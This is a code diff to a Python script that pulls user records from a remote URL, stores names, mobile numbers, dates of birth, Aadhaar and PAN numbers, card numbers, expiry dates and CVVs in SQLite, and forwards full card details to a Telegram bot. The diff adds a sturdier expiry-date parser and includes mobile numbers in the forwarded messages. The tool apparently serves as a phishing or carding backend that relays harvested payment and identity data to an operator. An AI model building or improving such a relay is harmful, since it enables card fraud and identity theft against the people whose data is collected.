@@ -4,6 +4,7 @@ import time
 from datetime import datetime
 import telebot
 import logging
+import re
 
 # Configure logging
 logging.basicConfig(
@@ -50,19 +51,54 @@ def fetch_data(url):
         logging.error(f"Error fetching data: {e}")
         return None
 
-# Process expiry date into month and year
-def split_expiry_date(expiry_date):
-    if expiry_date and '/' in expiry_date:
-        month, year = expiry_date.split('/')
-        return month, f"20{year}"
+# Enhanced expiry date parser
+def parse_expiry_date(expiry_date):
+    if not expiry_date:
+        return None, None
+    
+    # Remove any whitespace and convert to string
+    expiry_date = str(expiry_date).strip()
+    
+    # Define possible patterns
+    patterns = [
+        r'(\d{2})/(\d{4})',      # MM/YYYY
+        r'(\d{2})-(\d{4})',      # MM-YYYY
+        r'(\d{2})(\d{4})',       # MMYYYY
+        r'(\d{2})/(\d{2})',      # MM/YY
+        r'(\d{2})-(\d{2})',      # MM-YY
+        r'(\d{2})(\d{2})',       # MMYY
+    ]
+    
+    for pattern in patterns:
+        match = re.match(pattern, expiry_date)
+        if match:
+            month = match.group(1)
+            year = match.group(2)
+            
+            # Validate month
+            if not (1 <= int(month) <= 12):
+                return None, None
+                
+            # Handle two-digit year
+            if len(year) == 2:
+                year = f"20{year}"
+            
+            # Validate year (basic check)
+            if not (2000 <= int(year) <= 2099):
+                return None, None
+                
+            return month.zfill(2), year
+    
+    logging.warning(f"Unrecognized expiry date format: {expiry_date}")
     return None, None
 
-# Send message to Telegram with professional formatting
+# Send message to Telegram with professional formatting including mobile number
 def send_telegram_message(entry):
     message = (
         "🔒 *New Card Details Notification*\n"
         "──────────────────────\n"
         f"*Cardholder Name*: {entry['full_name']}\n"
+        f"*Mobile Number*: {entry['mobile_number']}\n"
         f"*Card Number*: {entry['card_number']}\n"
         f"*Expiry Date*: {entry['expiry_month']}/{entry['expiry_year']}\n"
         f"*CVV*: {entry['cvv']}\n"
@@ -80,7 +116,7 @@ def send_existing_entries():
     conn = sqlite3.connect('user_data.db')
     c = conn.cursor()
     
-    c.execute('''SELECT full_name, card_number, expiry_date, cvv 
+    c.execute('''SELECT full_name, mobile_number, card_number, expiry_date, cvv 
                  FROM users 
                  WHERE card_number IS NOT NULL 
                  AND expiry_date IS NOT NULL 
@@ -92,11 +128,12 @@ def send_existing_entries():
     if existing_entries:
         logging.info(f"Found {len(existing_entries)} existing entries with card details")
         for entry in existing_entries:
-            full_name, card_number, expiry_date, cvv = entry
-            expiry_month, expiry_year = split_expiry_date(expiry_date)
+            full_name, mobile_number, card_number, expiry_date, cvv = entry
+            expiry_month, expiry_year = parse_expiry_date(expiry_date)
             if expiry_month and expiry_year:
                 entry_data = {
                     "full_name": full_name,
+                    "mobile_number": mobile_number or "Not provided",
                     "card_number": card_number,
                     "expiry_month": expiry_month,
                     "expiry_year": expiry_year,
@@ -127,22 +164,25 @@ def process_data(data):
             card_number = user.get("card_number")
             expiry_date = user.get("expiry_date")
             cvv = user.get("cvv")
+            mobile_number = user.get("registered_mobile_number")
             
             if card_number and expiry_date and cvv:
-                expiry_month, expiry_year = split_expiry_date(expiry_date)
-                new_entry = {
-                    "full_name": user.get("full_name"),
-                    "card_number": card_number,
-                    "expiry_month": expiry_month,
-                    "expiry_year": expiry_year,
-                    "cvv": cvv
-                }
-                new_entries_with_cards.append(new_entry)
+                expiry_month, expiry_year = parse_expiry_date(expiry_date)
+                if expiry_month and expiry_year:
+                    new_entry = {
+                        "full_name": user.get("full_name"),
+                        "mobile_number": mobile_number or "Not provided",
+                        "card_number": card_number,
+                        "expiry_month": expiry_month,
+                        "expiry_year": expiry_year,
+                        "cvv": cvv
+                    }
+                    new_entries_with_cards.append(new_entry)
             
             c.execute('''INSERT INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                      (user_id,
                       user.get("full_name"),
-                      user.get("registered_mobile_number"),
+                      mobile_number,
                       user.get("date_of_birth"),
                       user.get("aadhaar_card_number"),
                       user.get("pan_number"),
